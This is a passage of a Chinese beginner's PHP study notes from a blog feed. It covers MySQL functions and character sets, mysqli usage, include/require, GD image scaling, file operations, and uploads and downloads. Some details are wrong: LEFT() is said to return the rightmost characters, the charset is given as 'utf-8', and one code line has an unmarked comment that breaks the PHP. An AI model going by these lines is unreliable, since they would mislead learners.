class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">CONCAT(S1,S2,...Sn)连接S1,S2,...Sn为一个字符串</span><br><span class="line">  INSERT(str,x,y,instr)将字符串str从第x位置开始，y个字符长的字符串换位字符串instr</span><br><span class="line">  LOWER(str)将字符串str中所有字符变为小写</span><br><span class="line">  UPPER(str)将字符串str中所有字符变为大写</span><br><span class="line">  LEFT(str,x)返回字符串str最右边的x个字符</span><br><span class="line">  RIGHT(str,x)返回字符串str最右边的x个字符</span><br><span class="line">  LPAD(str,n,pad)用字符串pad对str最左边进行填充，直到长度为n个字符长度</span><br><span class="line">  RPAD(str,n,pad)用字符串pad对str最右边进行填充，直到长度为n个字符长度</span><br><span class="line">  LTRIM(str)去掉字符串str左侧的空格</span><br><span class="line">  RTRIM(str)去掉字符串str行尾的空格</span><br><span class="line">  REPEAT(str,x)返回str重复x次的结果</span><br><span class="line">  REPLACE(str,a,b)用字符串b替换字符串str中所有出现的字符串a</span><br><span class="line">  STRCMP(s1,s2)比较字符串s1和s2</span><br><span class="line">  TRIM(str)去掉字符串行尾和行头的空格</span><br><span class="line">  SUBSTRING(str,x,y)返回从字符串str x位置起y个字符长度的字符串</span><br><span class="line">  LENGTH(str)返回字符串长度</span><br></pre></td></tr></table></figure><ol start="2"><li>数值函数</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ABS(x)返回x的绝对值</span><br><span class="line">  CEIL(x)返回大于x的最小整数值</span><br><span class="line">  FLOOR(x)返回小于x的最大整数值</span><br><span class="line">  MOD(x,y)返回x/y的模</span><br><span class="line">  RAND()返回0-1内的随机值</span><br><span class="line">  ROUND(x,y)返回参数x的四舍五入的有y位小数的值</span><br><span class="line">  TRUNCATE(x,y)返回数字x截断为y位小数的结果</span><br></pre></td></tr></table></figure><ol start="3"><li>日期和时间函数</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CURDATE()返回当前日期</span><br><span class="line">  CURTIME()返回当前时间</span><br><span class="line">  NOW()返回当前的日期和时间</span><br><span class="line">  UNIX_TIMESTAMP(date)返回日期date的UNIX时间戳</span><br><span class="line">  FROM_UNIXTIME()返回UNIX时间戳的日期值</span><br><span class="line">  WEEK(date)返回日期date为一年中的第几周</span><br><span class="line">  YEAR(date)返回日期date的年份</span><br><span class="line">  HOUR(time)返回time的小时值</span><br><span class="line">  MINUTE(time)返回time的分钟值</span><br><span class="line">  MONTHNAME(date)返回date的月份名</span><br><span class="line">  DATE_FORMAT(date,fmt)返回按字符串fmt格式化日期date值</span><br><span class="line">  DATE_ADD(add,INTERVAL expr <span class="built_in">type</span>) 返回一个日期或时间值加上一个时间间隔的时间值</span><br><span class="line">  DATEDIFF(expr,expr2)返回起始时间expr和结束时间expr2之间的天数</span><br></pre></td></tr></table></figure><ol start="4"><li>流程函数</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1)IF(value,t,f)如果value是真，返回t,否则返回f</span><br><span class="line">select <span class="keyword">if</span>(field1&gt;1000,<span class="string">&#x27;满分&#x27;</span>,<span class="string">&#x27;零蛋&#x27;</span>);</span><br><span class="line">2)IFNULL(value1,value2)如果value1不为null，返回value1，否则value1该是什么还是什么</span><br><span class="line">select ifnull(name,<span class="string">&#x27;假名&#x27;</span>);</span><br><span class="line">3)CASE WHEN [value1] THEN [result1]...ELSE[default]END如果value1是真，返回result1，否则返回default</span><br><span class="line">select <span class="keyword">case</span> when 100&gt;10 <span class="keyword">then</span> <span class="string">&#x27;真&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;假&#x27;</span> end;</span><br><span class="line">和<span class="keyword">if</span>语句比较像</span><br><span class="line">4)CASE [expr] WHEN [value1] THEN[result1]...ELSE[default]END  如果expr等于value1，返回result1，否则返回default</span><br><span class="line">select <span class="keyword">case</span> 1 when 1 <span class="keyword">then</span> <span class="string">&#x27;一&#x27;</span> when 2 <span class="keyword">then</span> <span class="string">&#x27;二&#x27;</span> when 3 <span class="keyword">then</span> <span class="string">&#x27;三&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;未知数字&#x27;</span>end;</span><br><span class="line">和switch语句比较像</span><br></pre></td></tr></table></figure><ol start="5"><li>其他常用函数</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DATABASE()返回当前数据库名</span><br><span class="line">VERSION()返回当前数据库版本</span><br><span class="line">USER()返回当前登录用户名</span><br><span class="line">INET_ATON(IP)返回IP地址的数字表示</span><br><span class="line">INET_NTOA(num)返回数字代表的IP地址</span><br><span class="line">PASSWORD(str)返回字符串str的加密版本</span><br><span class="line">MD5()返回字符串str的MD5值</span><br></pre></td></tr></table></figure><h2 id="知识补充：数据库字符编码"><a href="#知识补充：数据库字符编码" class="headerlink" title="知识补充：数据库字符编码"></a>知识补充：数据库字符编码</h2><h3 id="一、MySQL支持的字符集"><a href="#一、MySQL支持的字符集" class="headerlink" title="一、MySQL支持的字符集"></a>一、MySQL支持的字符集</h3><p>1.查看所有可用的字符集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show character <span class="built_in">set</span>;</span><br><span class="line">或者查看information_schema.character_sets，也可以显示所有的字符集和该字符集默认的校队规则</span><br></pre></td></tr></table></figure><p>2.MySQL的字符集包括字符集(character)和校对规则(collation)两个概念。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1)字符集用来定义MySQL存储字符串的方式</span><br><span class="line">2)校对规则用来定义 字符串比较的方式</span><br><span class="line">3)字符集和校对规则是一对多的关系,一个字符集有多个校对规则供你选择!</span><br><span class="line">  校对规则命名约定：它们以相关的字符集名开始，通常包括一个语言名，并且以</span><br><span class="line">  _ci(忽略大小写)、</span><br><span class="line">  _cs(大小写敏感)或者</span><br><span class="line">  _bin(二元，即比较是基于字符编码的值而与language无关)结束。</span><br><span class="line">查看字符集的校对规则：</span><br><span class="line">show  collation like <span class="string">&#x27;字符集前缀%&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="二、MySQL内部的字符集和校对规则设置"><a href="#二、MySQL内部的字符集和校对规则设置" class="headerlink" title="二、MySQL内部的字符集和校对规则设置"></a>二、MySQL内部的字符集和校对规则设置</h3><ol><li>数据库字符集和校对规则设置</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE db_name</span><br><span class="line">[[DEFAULT] CHARACTER SET charset_name]</span><br><span class="line">[[DEFAULT] COLLATE collation_name]</span><br><span class="line">查看当前数据库的字符集和校对规则：</span><br><span class="line">show variables like <span class="string">&#x27;character_set_database&#x27;</span>;</span><br><span class="line">show variables like <span class="string">&#x27;collation_database&#x27;</span>;</span><br><span class="line">ALTER DATABASE db_name</span><br><span class="line">[[DEFAULT] CHARACTER SET charset_name]</span><br><span class="line">[[DEFAULT] COLLATE collation_name]</span><br></pre></td></tr></table></figure><ol start="2"><li>表字符集和校对规则设置</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE tbl_name (column_list)</span><br><span class="line">[DEFAULT CHARACTER SET charset_name [COLLATE collation_name]]</span><br><span class="line"> </span><br><span class="line">ALTER TABLE tbl_name</span><br><span class="line">[DEFAULT CHARACTER SET charset_name] [COLLATE collation_name]</span><br></pre></td></tr></table></figure><p>连接字符集设置：客户端和服务器之间交互的字符集</p><h1 id="在PHP中使用mysql与mysqli交互"><a href="#在PHP中使用mysql与mysqli交互" class="headerlink" title="在PHP中使用mysql与mysqli交互"></a>在PHP中使用mysql与mysqli交互</h1><h2 id="一、使用mysqli"><a href="#一、使用mysqli" class="headerlink" title="一、使用mysqli"></a>一、使用mysqli</h2><p>在PHP中可以使用mysqli扩展与mysql数据库进行信息交流，i表示改进，增强，它执行速度更快，是一种面向对象的技术。</p><ol><li>建立、关闭与MySQL服务器的连接<br>①：连接指定的MySQL服务器<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$mysql_connect&#x3D;@mysqli_connect($host,$user,$password,$database,$port);</span><br></pre></td></tr></table></figure>默认端口3306，可不填。<br>②：连接错误时提示<br>③：设置默认字符编码<br>④：选择特定的数据库<br>⑤：关闭与mysql服务器的连接<br>下面一个栗子：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">$link=@mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;3306&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_errno())&#123;</span><br><span class="line">    <span class="keyword">exit</span>(mysqli_connect_errno());</span><br><span class="line">&#125;</span><br><span class="line">mysqli_set_charset($link,<span class="string">&#x27;utf-8&#x27;</span>);<span class="comment">//设置默认字符编码</span></span><br><span class="line">mysqli_select_db($link,<span class="string">&#x27;test&#x27;</span>);<span class="comment">//选择特定的数据库</span></span><br><span class="line">mysqli_close($link);<span class="comment">//关闭与mysql服务器的连接</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>跑一下，如果没有报错，就是连接成功了。</p><h2 id="二、执行SQL语句"><a href="#二、执行SQL语句" class="headerlink" title="二、执行SQL语句"></a>二、执行SQL语句</h2><ol><li>对数据库执行一条SQL语句</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed mysqli_query ( mysqli $link , <span class="keyword">string</span> $query [, <span class="keyword">int</span> $resultmode = MYSQLI_STORE_RESULT ] );</span><br></pre></td></tr></table></figure><p>①对于insert，update，delete等不会返回数据的SQL语句，在执行没有错误时将返回true。<br>②对于返回数据的SQL语句执行成功的时候会返回结果集对象可以使用操作结果集对象的函数来从中获取数据</p><ol start="2"><li><p>操作结果集对象的函数<br>从结果集对象中解析数据的常见函数<br>①以索引数组的方式获取一条记录的数据<br> <code>mixed mysqli_fetch_row ( mysqli_result $result );</code></p><pre><code>                    重复使用以获取下一条记录的数据</code></pre><p>②以关联数组的方式获取一条记录的数据</p><pre><code>                    `array mysqli_fetch_assoc ( mysqli_result $result );`                    重复使用以获取下一条记录的数据      ③以索引数组或关联数组的方式获取一条记录的数据                 `   mixed mysqli_fetch_array ( mysqli_result $result [, int $resulttype = MYSQLI_BOTH ] );`                    重复使用以获取下一条记录的数据      ④以索引数组或关联数组的方式获取全部记录的数据                   ` mixed mysqli_fetch_all ( mysqli_result $result [, int $resulttype = MYSQLI_NUM ] );`      ⑤返回结果集中的下一个字段信息             `       object mysqli_fetch_field ( mysqli_result $result );`      ⑥返回一个代表结果集字段的对象数组                 `   array mysqli_fetch_fields ( mysqli_result $result );`      ⑦获取结果中行的数量                 `   int mysqli_num_rows ( mysqli_result $result );`                    注意：如果使用MYSQLI_USE_RESULT模式则必须在获取完结果集才可使用该函数。</code></pre></li><li><p>释放与一个结果集相关的内存<br>返回的结果集在数据量很大的时候需要很多的内存支持，所以在操作完结果集的时候有必要立刻释放与一个结果集相关的内</p><pre><code>      存， 释放之后，结果集就不可用了      `void mysqli_free_result ( mysqli_result $result );`</code></pre><h1 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h1></li><li><p>include语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/login.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;login.php&#x27;</span>;<span class="comment">//include后面接上一个空格然后接上一个字符串，字符串里面是要包含进来并执行的一个php文件的路径</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个就好像是C++中分开写代码那样(跟继承差不多)，可以用<code>#include &quot;xxxx.h&quot;</code>来使用这个类。相当于原本一个代码将它拆分成两个，逻辑更加清晰。(实际上还是一个代码。)</p></li><li><p>include_once语句<br>如果文件被包含，则不会再次包含，可以用在脚本执行期间同一个文件有可能被包含超过一次的情况下，想确保文件只被包含一次以避免函数重定义，变量赋值等问题。</p></li><li><p>require语句<br>和include语句差不多，处理失败的方式不同，include是出错了还会接着执行，但是require语句是出错了就会停止执行。</p></li><li><p>require_once语句<br>与require语句基本相同，唯一区别就是php会检查这个文件是否已经被包含过了，如果包含过，那么就不会再次包含。</p></li></ol><p>终于到此结束，但是感觉这是边学边忘，这样肯定不行，接下来找时间学习开发小论坛，最起码不能学了跟没有学一样吧，如果这样就是在浪费时间。</p><p>文末寄语：</p><blockquote><p>一个远行的人要寻找什么呢？可能他自己也不知道，他只是寻找，张望，直到最后，寻找成了他的命运。就像我在你身上，寻找我的命运，那不能把握没法参透的一部分，就是我们的真爱。                                                                                         ——    田艺苗《旅人》</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP从零开始——学习笔记(3)</title>
      <link href="/2020/08/23/php%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E2%80%94%E2%80%94%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>/2020/08/23/php%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E2%80%94%E2%80%94%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="图像处理"><a href="#图像处理" class="headerlink" title="图像处理"></a>图像处理</h1><h2 id="裁剪与缩放"><a href="#裁剪与缩放" class="headerlink" title="裁剪与缩放"></a>裁剪与缩放</h2><p>裁剪：<br>利用<code>imagecopyresampled()</code>函数，<br><code>imagecopyresampled(dst_image, src_image, dst_x, dst_y, src_x, src_y, dst_w, dst_h, src_w, src_h)</code><br>函数参数说明：<br>dst_image：目标图象<br>src_image：源图像资源（要采集的那个图像资源）<br>dst_x, dst_y：确定一个坐标，把采样到的部分，放到目标图像资源的什么位置。<br>src_x, src_y：确定一个坐标，确定一个坐标，（是要采样的原图像资源的某个部分的起始坐标）<br>dst_w, dst_h：确定放在目标图象资源上的尺寸<br>src_w, src_h：确定了裁剪部分的尺寸。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:image/jpeg&#x27;</span>);</span><br><span class="line">$img=imagecreatefromjpeg(<span class="string">&#x27;images/2.jpg&#x27;</span>);</span><br><span class="line">$img1=imagecreatetruecolor(<span class="number">300</span>, <span class="number">300</span>);</span><br><span class="line">imagecopyresampled($img1, $img, <span class="number">100</span>, <span class="number">100</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">200</span>, <span class="number">200</span>, <span class="number">200</span>, <span class="number">200</span>);</span><br><span class="line">imagejpeg($img1);</span><br><span class="line">imagedestroy($img1);<span class="comment">//两个都要销毁。</span></span><br><span class="line">imagedestroy($img);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>缩放：<br>demo示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:image/jpeg&#x27;</span>);</span><br><span class="line">$width=<span class="number">200</span>;</span><br><span class="line">$img=imagecreatefromjpeg(<span class="string">&#x27;images/2.jpg&#x27;</span>);</span><br><span class="line">$imgWidth=imagesx($img);<span class="comment">//得到源图像（需要缩小的图片）的x轴坐标</span></span><br><span class="line">$imgHeight=imagesy($img);<span class="comment">//得到源图像（需要缩小的图片）的y轴坐标</span></span><br><span class="line">$height=$width/($imgWidth/$imgHeight);<span class="comment">//确定放到目标图象上的尺寸，这里是全部放上去。所以是整个图片的尺寸</span></span><br><span class="line">$img1=imagecreatetruecolor($width, $height);创建一个与源图像尺寸相同的图像。</span><br><span class="line">imagecopyresampled($img1, $img, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, $width, $height, $imgWidth, $imgHeight);</span><br><span class="line">imagejpeg($img1);</span><br><span class="line">imagedestroy($img1);</span><br><span class="line">imagedestroy($img);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面为缩小示例，等比例缩放，不仅是尺寸缩小了，而且它的图片所占空间（大小）也变小了。则用HTML的CSS进行缩小的时候，他的所占空间大小是不会变的，而且画质可能会有变化。</p><h1 id="文件与目录操作"><a href="#文件与目录操作" class="headerlink" title="文件与目录操作"></a>文件与目录操作</h1><p>PHP可以在服务器上生成目录、创建、编辑、删除、修改文件属性等操作</p><h2 id="判断普通文件和目录"><a href="#判断普通文件和目录" class="headerlink" title="判断普通文件和目录"></a>判断普通文件和目录</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> is_file()<span class="comment">//判断给定文件名是否为一个正常的文件</span></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> is_dir()<span class="comment">//判断给定文件名是否为一个目录</span></span><br></pre></td></tr></table></figure><h2 id="文件属性"><a href="#文件属性" class="headerlink" title="文件属性"></a>文件属性</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> file_exists()<span class="comment">//检查文件或目录是否存在(返回true或false)</span></span><br><span class="line"><span class="number">2.</span> filesize()<span class="comment">//取得普通文件大小(单位是字节)//参数放文件名或文件路径</span></span><br><span class="line"><span class="number">3.</span> is_readable()<span class="comment">//判断给定的文件是否可读</span></span><br><span class="line"><span class="number">4.</span> is_writeable()<span class="comment">//判断给定文件是否可写</span></span><br><span class="line"><span class="number">5.</span> filectime()<span class="comment">//获取文件的创建时间</span></span><br><span class="line"><span class="number">6.</span> filemtime()<span class="comment">//获取文件的修改时间</span></span><br><span class="line"><span class="number">7.</span> fileatime()<span class="comment">//获取文件的上次访问时间</span></span><br><span class="line"><span class="number">8.</span> stat()<span class="comment">//获取文件大部分属性值</span></span><br></pre></td></tr></table></figure><h2 id="目录的基本操作"><a href="#目录的基本操作" class="headerlink" title="目录的基本操作"></a>目录的基本操作</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> basename()<span class="comment">//返回路径中的文件名部分</span></span><br><span class="line"><span class="number">2.</span> dirname()<span class="comment">//返回路径中的目录部分</span></span><br><span class="line"><span class="number">3.</span> pathinfo()<span class="comment">//返回文件路径的信息</span></span><br><span class="line"><span class="number">4.</span> opendir()<span class="comment">//打开目录句柄</span></span><br><span class="line"><span class="number">5.</span> readdir()<span class="comment">//从目录句柄中读取条目，返回目录中下一个文件的文件名</span></span><br><span class="line"><span class="number">6.</span> rewinddir()<span class="comment">//倒回目录句柄</span></span><br><span class="line"><span class="number">7.</span> closedir()<span class="comment">//关闭目录句柄</span></span><br><span class="line"><span class="number">8.</span> mkdir()<span class="comment">//新建目录</span></span><br><span class="line"><span class="number">9.</span> rmdir()<span class="comment">//删除指定的空目录</span></span><br><span class="line"><span class="number">10.</span> scandir()<span class="comment">//列出指定路径中的文件和目录</span></span><br></pre></td></tr></table></figure><h2 id="文件的基本操作"><a href="#文件的基本操作" class="headerlink" title="文件的基本操作"></a>文件的基本操作</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> fopen()<span class="comment">//打开文件或者URL</span></span><br><span class="line"><span class="number">2.</span> fread()<span class="comment">//读取文件</span></span><br><span class="line"><span class="number">3.</span> fgets()<span class="comment">//从文件指针中读取一行</span></span><br><span class="line"><span class="number">4.</span> feof()<span class="comment">//测试文件指针是否到了文件结束的位置</span></span><br><span class="line"><span class="number">5.</span> fwrite()<span class="comment">//写入文件   返回值为写入的字节数</span></span><br><span class="line"><span class="number">6.</span> rewind()<span class="comment">//倒回文件指针的位置</span></span><br><span class="line"><span class="number">7.</span> flock()<span class="comment">//轻便的咨询文件锁定</span></span><br><span class="line"><span class="number">8.</span> ftruncate()<span class="comment">//将文件截断到给定的长度</span></span><br><span class="line"><span class="number">9.</span> fclose()<span class="comment">//关闭一个已打开的文件指针</span></span><br><span class="line"><span class="number">10.</span> file()<span class="comment">//将整个文件读入一个数组中</span></span><br><span class="line"><span class="number">11.</span> copy()<span class="comment">//拷贝文件</span></span><br><span class="line"><span class="number">12.</span> unlink()<span class="comment">//删除文件</span></span><br><span class="line"><span class="number">13.</span> file_get_contents()<span class="comment">//将整个文件读入一个字符串</span></span><br><span class="line"><span class="number">14.</span> file_put_contents()<span class="comment">//将字符串写入文件中</span></span><br><span class="line"><span class="number">15.</span> rename()<span class="comment">//重命名一个文件或目录</span></span><br><span class="line"><span class="number">16.</span> readfile()<span class="comment">// 读入一个文件并写入到输出缓冲</span></span><br><span class="line"><span class="number">17.</span> fseek()<span class="comment">//在文件指针中定位</span></span><br></pre></td></tr></table></figure><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>文见上传的过程是自动的，不需要管。上传的文件默认是放在一个临时的目录里面的，要做的就是把临时目录里的文件移动到需要它的地方就可以了。</p><p>1.html标签需要做的上传设置</p><blockquote><p>form标签属性设置</p><ul><li><p>method设置为post</p></li><li><p>enctype设置为multipart/form-data</p></li><li><p>form表单中设置隐藏类型的input其中name值设置为MAX_FILE_SIZE,value值设置为需要限制的上传文件的大小</p></li></ul></blockquote><p>2.在服务器端通过PHP处理上传文件，设计以下几条信息</p><p>在phpstudy中的设置路径：<code>D:\phpStudy\PHPTutorial\php\php-5.4.45-nts</code></p><blockquote><p>配置项                                可能值                         功能描述<br>file_uploads                      On                     确定服务器上的PHP脚本是否可以接受http文件上传<br>memory_limit                  128M                 设置脚本可以分配的最大内存量，防止失控的脚本独占服务器内存<br>upload_max_filesize       2M                     限制PHP处理上传文件的最大值，此值必须小于post_max_size的值<br>post_max_size                 8M                     限制通过POST方法可以接受的信息最大量<br>upload_tmp_dir            没有设定，自己设置一下         文件上传存放的临时路径，可以是一个绝对路径，这个目录对于拥有此服务器进程用户必须是可写的。</p></blockquote><p><code>$_FILES</code>多维数组，用于存储各种与上传有关的信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]客户端机器文件的原名称，包含扩展名</span><br><span class="line">$_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>]已上传文件的大小，单位为字节</span><br><span class="line">$_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]文件上传之后，在服务器端存储的临时文件</span><br><span class="line">$_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>]文件上传时产生的错误</span><br><span class="line">    <span class="number">0</span>：表示没有发生任何错误，文件上传成功</span><br><span class="line">    <span class="number">1</span>：表示上传文件的大小超出在PHP配置文件中upload_max_filesize选项限制的值</span><br><span class="line">    <span class="number">2</span>：表示上传文件大小超出了HTML表单中MAX_FILE_SIZE选项所指定的值。</span><br><span class="line">    <span class="number">3</span>：表示文件只被部分上传</span><br><span class="line">    <span class="number">4</span>：表示没有上传任何文件</span><br><span class="line">$_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>]获取客户端上传文件的MIME类型，MIME类型规定了各种文件格式的类型，每种MIME类型都是由/分隔的主类型和子类型组成</span><br></pre></td></tr></table></figure><p>PHP的文见上传处理函数，用于上传文件的后续处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">is_uploaded_file()判断指定的文件是否通过http post上传的</span><br><span class="line">move_uploaded_file()文件上传后，首先会储存于服务器的临时目录中，可以使用该函数将上传的文件移动到新位置</span><br></pre></td></tr></table></figure><h2 id="文件的下载"><a href="#文件的下载" class="headerlink" title="文件的下载"></a>文件的下载</h2><p>1.发送指定的文件MIME类型的头信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">&#x27;Content-type:MIME类型&#x27;</span>);</span><br></pre></td></tr></table></figure><p>2.指定下载文件的描述</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">&#x27;Content-Disposition:attachement;filename=文件名称&#x27;</span>);</span><br></pre></td></tr></table></figure><p>3.指定下载文件的大小</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">&#x27;Content-Length:文件大小&#x27;</span>);</span><br></pre></td></tr></table></figure><p>4.读取文件内容至输出缓冲区</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile();</span><br></pre></td></tr></table></figure><p>关于<code>fileinfo</code>扩展。可以用来返回文件的MIME类型</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$fileinfo=finfo_open(FILEINFO_MIME_TYPE);</span><br></pre></td></tr></table></figure><p>打开资源，最后要记得用<code>fileinfo_close()</code>释放掉资源</p><h1 id="会话控制"><a href="#会话控制" class="headerlink" title="会话控制"></a>会话控制</h1><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>关于记录什么的，随时看随时学，只这一条链接就够了<br><a href="https://baike.baidu.com/item/cookie/1119?fr=aladdin">cookie百度百科</a><br><img 